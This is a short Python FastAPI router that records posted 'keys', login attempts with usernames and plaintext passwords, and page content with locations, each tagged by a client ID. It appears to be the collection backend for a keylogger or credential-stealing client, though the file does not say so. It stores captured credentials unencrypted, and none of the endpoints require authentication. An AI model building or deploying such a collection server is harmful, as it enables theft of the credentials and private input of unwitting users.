from fastapi import APIRouter
from ..schemas import KeySchema, LoginAttemptSchema, ContentSchema
from sqlalchemy import insert
from app.database import SessionLocal
from ..models import KeyModel, LoginAttemptModel, ContentModel

router = APIRouter(prefix="/data", tags=["data"])


@router.post("/keys")
async def save_keys(key: KeySchema):
    with SessionLocal() as session:
        stmt = insert(KeyModel).values(
            key=key.key,
            client_id=key.client_id
        )
        session.execute(stmt)
        session.commit()
    return key


@router.post("/login")
async def save_login(loginAttempt: LoginAttemptSchema):
    with SessionLocal() as session:
        stmt = insert(LoginAttemptModel).values(
            username=loginAttempt.username,
            password=loginAttempt.password,
            client_id=loginAttempt.client_id
        )
        session.execute(stmt)
        session.commit()
    return loginAttempt


@router.post("/content")
async def save_content(content: ContentSchema):
    with SessionLocal() as session:
        stmt = insert(ContentModel).values(
            location=content.location,
            content=content.content,
            client_id=content.client_id
        )
        session.execute(stmt)
        session.commit()
    return content